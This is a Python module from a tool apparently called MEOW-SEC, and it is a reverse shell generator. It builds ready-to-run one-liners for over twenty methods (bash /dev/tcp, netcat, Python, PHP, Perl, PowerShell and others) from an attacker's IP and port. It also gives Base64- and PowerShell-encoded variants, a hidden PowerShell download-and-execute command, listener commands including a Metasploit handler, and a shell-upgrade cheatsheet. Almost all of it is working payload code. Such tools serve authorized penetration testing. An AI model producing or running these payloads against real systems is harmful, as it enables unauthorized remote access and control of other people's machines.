# -*- coding: utf-8 -*-
"""
MEOW-SEC :: REVSHELL — Reverse Shell Generator
  · 15+ langages / méthodes
  · Encodage Base64, URL, PowerShell encoded
  · Listener command inclus
"""
import base64, os
from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_HACKER
from rich.panel   import Panel
from rich.table   import Table
from rich.text    import Text
from rich.syntax  import Syntax
from rich.align   import Align
from rich.prompt  import Prompt, IntPrompt, Confirm
from rich         import box
from rich.rule    import Rule

# ─── SHELL TEMPLATES ─────────────────────────────────────────

def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()

def _b64_utf16(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode()

SHELLS = {
    "bash_tcp": {
        "name": "Bash TCP",
        "os": "Linux",
        "cmd": lambda ip,port: f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    },
    "bash_b64": {
        "name": "Bash (Base64)",
        "os": "Linux",
        "cmd": lambda ip,port: (
            lambda raw: f"echo {_b64(raw)}|base64 -d|bash"
        )(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
    },
    "bash_196": {
        "name": "Bash /dev/tcp (fd 196)",
        "os": "Linux",
        "cmd": lambda ip,port: f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
    },
    "sh_udp": {
        "name": "sh UDP",
        "os": "Linux",
        "cmd": lambda ip,port: f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
    },
    "python3": {
        "name": "Python 3",
        "os": "Linux/Win",
        "cmd": lambda ip,port: (
            f'python3 -c \'import socket,subprocess,os;s=socket.socket();'
            f's.connect(("{ip}",{port}));os.dup2(s.fileno(),0);'
            f'os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            f'subprocess.call(["/bin/sh","-i"])\''
        ),
    },
    "python2": {
        "name": "Python 2",
        "os": "Linux",
        "cmd": lambda ip,port: (
            f'python -c \'import socket,subprocess,os;s=socket.socket();'
            f's.connect(("{ip}",{port}));os.dup2(s.fileno(),0);'
            f'os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            f'subprocess.call(["/bin/sh","-i"])\''
        ),
    },
    "python_b64": {
        "name": "Python 3 (Base64)",
        "os": "Linux/Win",
        "cmd": lambda ip,port: (
            lambda raw: f'python3 -c "exec(__import__(\'base64\').b64decode(\'{_b64(raw)}\').decode())"'
        )(
            f'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));'
            f'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
            f'subprocess.call(["/bin/sh","-i"])'
        ),
    },
    "php_exec": {
        "name": "PHP exec",
        "os": "Linux/Win",
        "cmd": lambda ip,port: (
            f'php -r \'$sock=fsockopen("{ip}",{port});'
            f'exec("/bin/sh -i <&3 >&3 2>&3");\''
        ),
    },
    "php_proc": {
        "name": "PHP proc_open",
        "os": "Linux/Win",
        "cmd": lambda ip,port: (
            f'php -r \'$s=fsockopen("{ip}",{port});'
            f'$p=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$pipes);\''
        ),
    },
    "nc_e": {
        "name": "Netcat -e",
        "os": "Linux/Win",
        "cmd": lambda ip,port: f"nc {ip} {port} -e /bin/sh",
    },
    "nc_mkfifo": {
        "name": "Netcat mkfifo",
        "os": "Linux",
        "cmd": lambda ip,port: f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    },
    "perl": {
        "name": "Perl",
        "os": "Linux",
        "cmd": lambda ip,port: (
            f'perl -e \'use Socket;$i="{ip}";$p={port};'
            f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            f'connect(S,sockaddr_in($p,inet_aton($i)));'
            f'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
            f'exec("/bin/sh -i");\''
        ),
    },
    "ruby": {
        "name": "Ruby",
        "os": "Linux",
        "cmd": lambda ip,port: (
            f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;'
            f'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
        ),
    },
    "powershell": {
        "name": "PowerShell TCP",
        "os": "Windows",
        "cmd": lambda ip,port: (
            f'powershell -nop -c "$client=New-Object Net.Sockets.TCPClient(\'{ip}\',{port});'
            f'$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};'
            f'while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{;'
            f'$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
            f'$sendback=(iex $data 2>&1|Out-String);'
            f'$sendback2=$sendback+\'PS \'+(pwd).Path+\'> \';'
            f'$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);'
            f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
        ),
    },
    "powershell_b64": {
        "name": "PowerShell (Encoded)",
        "os": "Windows",
        "cmd": lambda ip,port: (
            lambda raw: f"powershell -enc {_b64_utf16(raw)}"
        )(
            f'$client=New-Object Net.Sockets.TCPClient(\'{ip}\',{port});'
            f'$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};'
            f'while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){{'
            f'$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
            f'$sb=(iex $data 2>&1|Out-String)+\'PS \'+(pwd).Path+\'> \';'
            f'$sendbyte=([text.encoding]::ASCII).GetBytes($sb);'
            f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
        ),
    },
    "powershell_download": {
        "name": "PowerShell IEX Download",
        "os": "Windows",
        "cmd": lambda ip,port: (
            f'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient)'
            f'.DownloadString(\'http://{ip}:{port}/shell.ps1\')"'
        ),
    },
    "node": {
        "name": "Node.js",
        "os": "Linux/Win",
        "cmd": lambda ip,port: (
            f'node -e "(function(){{var n=require(\'net\');'
            f'var s=new n.Socket();s.connect({port},\'{ip}\',function(){{'
            f'var sp=require(\'child_process\').spawn(\'/bin/sh\',[]);'
            f's.pipe(sp.stdin);sp.stdout.pipe(s);sp.stderr.pipe(s)}})}})()"'
        ),
    },
    "socat": {
        "name": "Socat",
        "os": "Linux",
        "cmd": lambda ip,port: f"socat tcp-connect:{ip}:{port} exec:/bin/sh,pty,stderr,setsid,sigint,sane",
    },
    "golang": {
        "name": "Go (run)",
        "os": "Linux/Win",
        "cmd": lambda ip,port: (
            f'echo \'package main;import("net";"os";"os/exec");'
            f'func main(){{c,_:=net.Dial("tcp","{ip}:{port}");'
            f'cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}\' '
            f'> /tmp/r.go && go run /tmp/r.go'
        ),
    },
    "java": {
        "name": "Java Runtime",
        "os": "Linux/Win",
        "cmd": lambda ip,port: (
            f'r=Runtime.getRuntime();p=r.exec(new String[]{{"/bin/bash","-c",'
            f'"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"}});'
            f'p.waitFor();'
        ),
    },
    "awk": {
        "name": "AWK",
        "os": "Linux",
        "cmd": lambda ip,port: (
            f'awk \'BEGIN {{s="/inet/tcp/0/{ip}/{port}";while(1){{do{{printf "$ " |& s;'
            f's |& getline c;if(c){{while((c |& getline) > 0) print |& s;close(c)}}}}'
            f'while(c!="exit")close(s)}}}}\' /dev/null'
        ),
    },
    "lua": {
        "name": "Lua",
        "os": "Linux",
        "cmd": lambda ip,port: (
            f'lua5.1 -e \'local host="{ip}";local port={port};'
            f'local socket=require("socket");local tcp=socket.tcp();tcp:connect(host,port);'
            f'os.execute("/bin/sh -i <&3 >&3 2>&3")\''
        ),
    },
}

# ─── LISTENER COMMANDS ───────────────────────────────────────

def _listener(port: int, kind: str = "nc") -> str:
    if kind == "nc":
        return f"nc -lvnp {port}"
    elif kind == "ncat":
        return f"ncat -lvp {port}"
    elif kind == "socat":
        return f"socat -d -d TCP-LISTEN:{port},reuseaddr,fork STDOUT"
    elif kind == "pwncat":
        return f"pwncat-cs -lp {port}"
    elif kind == "metasploit":
        return (f"msfconsole -q -x 'use exploit/multi/handler;"
                f"set PAYLOAD generic/shell_reverse_tcp;"
                f"set LHOST 0.0.0.0;set LPORT {port};run'")
    return f"nc -lvnp {port}"

# ─── UPGRADE COMMANDS ────────────────────────────────────────

UPGRADE_CMDS = [
    ("Python PTY",       "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"),
    ("Script PTY",       "script /dev/null -c bash"),
    ("Stty raw",         "stty raw -echo; fg  (then: export TERM=xterm)"),
    ("Socat full TTY",   "socat file:`tty`,raw,echo=0 tcp-listen:PORT  (attacker)"),
    ("Stty size",        "stty rows 50 cols 200"),
]

# ─── MAIN ────────────────────────────────────────────────────

def run():
    show_module_banner("revshell")
    cat_talk(CAT_HACKER, "Reverse shell generator loaded.", OR)
    console.print()

    while True:
        console.print(f"  [{G1}][1][/] Generate reverse shell")
        console.print(f"  [{G1}][2][/] Shell upgrade cheatsheet  (dumb → full TTY)")
        console.print(f"  [{G1}][3][/] Export all shells to file")
        console.print(f"  [{G1}][0][/] Back")
        console.print()
        choice = ask_choice("REVSHELL", "0")

        if choice == "0": break
        elif choice == "1": _generate_menu()
        elif choice == "2": _upgrade_menu()
        elif choice == "3": _export_all()
        console.print()

def _generate_menu():
    console.print(Rule(f"[{G1}] REVERSE SHELL GENERATOR ", style=G2))

    ip   = Prompt.ask(f"  [{G1}]◈ Attacker IP (LHOST)[/]").strip()
    port = Prompt.ask(f"  [{G1}]◈ Port (LPORT)[/]", default="4444").strip()
    if not ip or not port: return

    # Choisir le type
    console.print()
    t = Table(box=box.SIMPLE, show_header=True, header_style=CY,
              border_style=G2, show_edge=False)
    t.add_column("#",    style=CY, width=4)
    t.add_column("Name", style=f"bold {G1}", width=25)
    t.add_column("OS",   style=DM, width=12)

    keys = list(SHELLS.keys())
    for i, k in enumerate(keys, 1):
        s = SHELLS[k]
        t.add_row(str(i), s["name"], s["os"])
    console.print(t)
    console.print()

    sel = Prompt.ask(f"  [{G1}]◈ Choice (1-{len(keys)})[/]", default="1").strip()
    try:
        idx = int(sel) - 1
        if not (0 <= idx < len(keys)):
            raise ValueError
    except ValueError:
        err("Invalid choice"); return

    key  = keys[idx]
    shell = SHELLS[key]
    cmd  = shell["cmd"](ip, port)

    console.print()
    console.print(Panel(
        Syntax(cmd, "bash", theme="monokai", word_wrap=True),
        title=f"[bold {G1}]◈  {shell['name']}  ◈  {ip}:{port}",
        border_style=G1
    ))

    # Listener
    console.print()
    listener_cmd = _listener(int(port))
    console.print(Panel(
        f"[bold {CY}]{listener_cmd}[/]",
        title=f"[{OR}]◈ Start listener (attacker machine) ◈",
        border_style=OR
    ))

    # Exporter ?
    if Confirm.ask(f"  [{G2}]◈ Save to file?[/]", default=False):
        os.makedirs("data", exist_ok=True)
        fname = f"data/revshell_{key}_{ip}_{port}.txt"
        with open(fname, "w", encoding="utf-8") as f:
            f.write(f"# {shell['name']}\n# LHOST={ip}  LPORT={port}\n\n")
            f.write(cmd + "\n\n")
            f.write(f"# Listener:\n{listener_cmd}\n")
        ok(f"Saved: {fname}")

def _upgrade_menu():
    console.print(Rule(f"[{G1}] SHELL UPGRADE CHEATSHEET ", style=G2))
    console.print(f"  [{DM}]Upgrade a dumb shell to a full interactive PTY:[/]")
    console.print()
    for name, cmd in UPGRADE_CMDS:
        console.print(f"  [{CY}]{name}[/]")
        console.print(f"    [{G1}]{cmd}[/]")
        console.print()

def _export_all():
    ip   = Prompt.ask(f"  [{G1}]◈ Attacker IP[/]").strip()
    port = Prompt.ask(f"  [{G1}]◈ Port[/]", default="4444").strip()
    if not ip or not port: return

    os.makedirs("data", exist_ok=True)
    fname = f"data/revshells_all_{ip}_{port}.txt"
    with open(fname, "w", encoding="utf-8") as f:
        f.write(f"# MEOW-SEC Reverse Shells  |  LHOST={ip}  LPORT={port}\n")
        f.write("=" * 60 + "\n\n")
        for k, s in SHELLS.items():
            f.write(f"## {s['name']}  [{s['os']}]\n")
            try:
                f.write(s["cmd"](ip, port) + "\n\n")
            except Exception as e:
                f.write(f"# error: {e}\n\n")
        f.write(f"\n## Listener\n{_listener(int(port))}\n")
    ok(f"Exported {len(SHELLS)} shells → {fname}")

def _banner():
    logo = Text(r"""
 ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
 ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
 ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
 ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
 ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
 ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
      [BASH · PYTHON · PHP · POWERSHELL · NC · PERL · RUBY · GO...]""",
        style=f"bold {G1}")
    console.print(Panel(Align(logo, align="center"), border_style=G1, padding=(0,1)))
